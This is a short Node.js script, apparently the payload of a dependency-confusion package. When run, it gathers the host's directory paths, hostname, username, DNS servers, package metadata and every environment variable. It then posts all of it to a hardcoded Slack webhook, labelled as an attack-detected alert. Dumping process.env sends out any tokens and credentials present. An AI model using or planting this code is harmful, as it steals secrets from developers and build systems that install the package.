const os = require('os');
const dns = require('dns');
const https = require('https');
const package = require('./package.json');

const slackWebhookUrl = 'https://hooks.slack.com/services/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';

const payload = JSON.stringify({
    text: `*Alert: Dependency Confusion Attack Detected!*\n*Current Directory:* ${__dirname}\n*Home Directory:* ${os.homedir()}\n*Hostname:* ${os.hostname()}\n*Username:* ${os.userInfo().username}\n*Dns-Server:* ${dns.getServers()}\n*Package:* ${JSON.stringify(package, null, 2)}\n*Environment Variables:* ${JSON.stringify(process.env)}`
});

const webhookReqOptions = {
    hostname: 'hooks.slack.com',
    path: slackWebhookUrl,
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'Content-Length': payload.length
    }
};

const req = https.request(webhookReqOptions, (res) => {
    console.log(`Status: ${res.statusCode}`);
    res.on('data', (d) => {
        process.stdout.write(d);
    });
});

req.on('error', (e) => {
    console.error(e);
});

req.write(payload);
req.end();
